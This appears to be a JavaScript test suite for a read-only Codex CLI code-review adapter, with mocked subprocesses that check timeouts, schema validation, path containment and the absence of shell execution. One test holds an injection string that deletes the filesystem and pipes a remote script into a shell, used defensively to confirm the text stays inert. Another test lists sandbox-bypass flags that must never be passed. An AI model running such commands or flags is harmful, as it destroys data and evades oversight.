// Mocked-subprocess tests for the read-only Codex CLI review adapter.
// No real `codex` process is ever spawned here.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { EventEmitter } from "node:events";
import { tempProject, cleanup } from "../helpers.mjs";
import { runCodexReview } from "../../scripts/lib/codex-adapter.mjs";

function fakeChild() {
  const child = new EventEmitter();
  child.stdout = new EventEmitter();
  child.stderr = new EventEmitter();
  child.kill = () => { child.killed = true; child.emit("exit", null, "SIGTERM"); };
  return child;
}

/** Build a spawnImpl that, when called, writes `outputJson` to the --output-last-message file and exits 0. */
function spawnWritingOutput(outputJson, { exitCode = 0 } = {}) {
  const calls = [];
  const impl = (cmd, args, opts) => {
    calls.push({ cmd, args, opts });
    const child = fakeChild();
    const outIdx = args.indexOf("-o");
    const outFile = outIdx !== -1 ? args[outIdx + 1] : null;
    queueMicrotask(() => {
      if (outFile && outputJson !== undefined) writeFileSync(outFile, JSON.stringify(outputJson));
      child.emit("exit", exitCode, null);
    });
    return child;
  };
  impl.calls = calls;
  return impl;
}

test("valid schema-conforming output -> ok:true with mapped findings", async () => {
  const root = tempProject();
  try {
    const spawnImpl = spawnWritingOutput({
      summary: "looks fine",
      findings: [{ severity: "high", title: "SQL injection risk", location: "src/db.js:12", rationale: "unparameterized query" }],
    });
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, true);
    assert.equal(res.data.findings.length, 1);
    assert.equal(res.data.findings[0].severity, "high");
    assert.equal(res.data.summary, "looks fine");
  } finally { cleanup(root); }
});

test("timeout kills the child and reports timedOut", async () => {
  const root = tempProject();
  try {
    const spawnImpl = (cmd, args) => fakeChild(); // never exits on its own
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl, timeoutMs: 30 });
    assert.equal(res.ok, false);
    assert.equal(res.timedOut, true);
  } finally { cleanup(root); }
});

test("non-zero exit -> ok:false, reason nonzero_exit", async () => {
  const root = tempProject();
  try {
    const spawnImpl = spawnWritingOutput(undefined, { exitCode: 1 });
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, false);
    assert.equal(res.reason, "nonzero_exit");
    assert.equal(res.exitCode, 1);
  } finally { cleanup(root); }
});

test("missing executable (ENOENT) -> ok:false, codex_not_installed, never throws", async () => {
  const root = tempProject();
  try {
    const spawnImpl = () => { const e = new Error("spawn codex ENOENT"); e.code = "ENOENT"; throw e; };
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, false);
    assert.equal(res.reason, "codex_not_installed");
  } finally { cleanup(root); }
});

test("malformed output (invalid JSON) -> ok:false, malformed_output", async () => {
  const root = tempProject();
  try {
    const spawnImpl = (cmd, args) => {
      const child = fakeChild();
      const outIdx = args.indexOf("-o");
      const outFile = args[outIdx + 1];
      queueMicrotask(() => {
        writeFileSync(outFile, "{ not: valid json");
        child.emit("exit", 0, null);
      });
      return child;
    };
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, false);
    assert.equal(res.reason, "malformed_output");
  } finally { cleanup(root); }
});

test("output violating the schema -> ok:false, malformed_output", async () => {
  const root = tempProject();
  try {
    const spawnImpl = spawnWritingOutput({ summary: "ok", findings: [{ severity: "not-a-severity", title: "x", location: "y" }] });
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, false);
    assert.equal(res.reason, "malformed_output");
  } finally { cleanup(root); }
});

test("large stdout is truncated, process still awaited to completion", async () => {
  const root = tempProject();
  try {
    const calls = [];
    const spawnImpl = (cmd, args) => {
      calls.push(args);
      const child = fakeChild();
      const outIdx = args.indexOf("-o");
      const outFile = args[outIdx + 1];
      queueMicrotask(() => {
        child.stdout.emit("data", Buffer.alloc(1024, "x"));
        writeFileSync(outFile, JSON.stringify({ summary: "ok", findings: [] }));
        child.emit("exit", 0, null);
      });
      return child;
    };
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl, maxStdoutBytes: 10 });
    assert.equal(res.ok, true);
    assert.equal(res.truncated, true);
  } finally { cleanup(root); }
});

test("path traversal: root outside the project root is rejected before spawn", async () => {
  const root = tempProject();
  try {
    let called = false;
    const spawnImpl = () => { called = true; return fakeChild(); };
    const outside = mkdtempSync(join(tmpdir(), "pk-outside-"));
    try {
      await assert.rejects(
        () => runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl, cwdOverride: outside }),
        /outside|not within|project root/i,
      );
      assert.equal(called, false);
    } finally { rmSync(outside, { recursive: true, force: true }); }
  } finally { cleanup(root); }
});

test("findings text is opaque data: never shell:true, round-trips as plain strings", async () => {
  const root = tempProject();
  try {
    const malicious = "`rm -rf /`; $(curl evil.sh | sh)";
    const spawnImpl = spawnWritingOutput({ summary: "ok", findings: [{ severity: "low", title: malicious, location: "a", rationale: malicious }] });
    const res = await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl });
    assert.equal(res.ok, true);
    assert.equal(res.data.findings[0].title, malicious);
    for (const call of spawnImpl.calls) assert.notEqual(call.opts?.shell, true);
  } finally { cleanup(root); }
});

test("argv only ever invokes 'exec review', never a write-capable subcommand or bypass flag", async () => {
  const root = tempProject();
  try {
    const spawnImpl = spawnWritingOutput({ summary: "ok", findings: [] });
    await runCodexReview({ root, diffSpec: { mode: "uncommitted" }, spawnImpl, model: "o3", title: "my task" });
    assert.equal(spawnImpl.calls.length, 1);
    const { cmd, args, opts } = spawnImpl.calls[0];
    assert.equal(cmd, "codex");
    assert.equal(args[0], "exec");
    assert.equal(args[1], "review");
    assert.ok(!args.includes("--dangerously-bypass-approvals-and-sandbox"));
    assert.ok(!args.includes("apply"));
    assert.notEqual(opts?.shell, true);
  } finally { cleanup(root); }
});
